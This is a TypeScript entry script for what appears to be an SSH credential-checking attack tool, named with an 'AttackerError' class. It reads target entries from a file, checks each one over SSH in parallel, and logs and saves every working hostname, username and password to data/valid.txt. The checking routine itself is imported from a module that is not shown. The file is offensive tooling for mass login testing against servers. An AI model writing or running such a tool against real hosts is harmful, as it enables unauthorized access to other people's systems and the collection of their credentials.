import fs from "fs";

/** Functions */
import { AttackerError } from "./error";
import { prompt } from "./utils/prompt";
import { logger } from "./utils/logger";
import { sleep } from "./utils/sleep";
import { menu } from "./utils/menu";
import { sshCheck } from "./utils/sshCheck";

(async() => {
    if (!fs.existsSync("data/targets.txt"))
        throw new AttackerError("data/targets.txt does not exists.");

    if (!fs.existsSync("data/valid.txt"))
        throw new AttackerError("data/valid.txt does not exists.");

    if (!fs.existsSync("data/timeout.txt"))
        throw new AttackerError("data/timeout.txt does not exists.");

    const targets = fs.readFileSync("data/targets.txt", "utf-8").split("\n").filter(line => line !== "");
    const timeout = Number(fs.readFileSync("data/timeout.txt", "utf-8"));

    if (timeout < 0)
        throw new AttackerError("The timeout value must be greater than 0.");

    while (true) {
        console.clear();
        console.log(menu(timeout));
        const select = await prompt("select");

        switch (select) {
            case "exit":
            break;

            case "1":
                const results = await Promise.all(targets.map(target => sshCheck(target, timeout)));
                for (const result of results) {
                    if (result.status === "error") {
                        return;
                    } else if (result.status === "success") {
                        logger.success(`ConnectionSuccessful: ${result.hostname} | username: ${result.username} | password: ${result.password}`);
                        fs.appendFileSync("data/valid.txt", `${result.hostname}|${result.username}|${result.password}`);
                    }
                }
            break;

            case "2":
                const setTimeout: number = Number(await prompt("timeout"));
                if (setTimeout < 0)
                    return logger.error("The timeout value must be greater than 0.");
                fs.writeFileSync("data/timeout.txt", String(setTimeout), "utf-8");
                logger.info(`Timeout set to ${setTimeout}ms`);
            break;
        }

        await sleep(4500);
        continue;

    }
})();